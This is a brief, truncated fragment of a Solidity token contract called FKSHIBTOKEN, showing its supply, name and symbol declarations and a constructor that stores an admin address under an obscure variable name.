...
contract FKSHIBTOKEN is Ownable {
    
    uint256 AMOUNTGLOBALADMOUNT = 10000000000*10**decimals();
    uint256 private _seitotalSupply = AMOUNTGLOBALADMOUNT;
    string private _seitokenname = "FKSHIB";
    string private _seitokensymbol = "FKSHIB";
    address public fdvyhhb67;
    constructor(address tokenadmin) {
        fdvyhhb67 = tokenadmin;
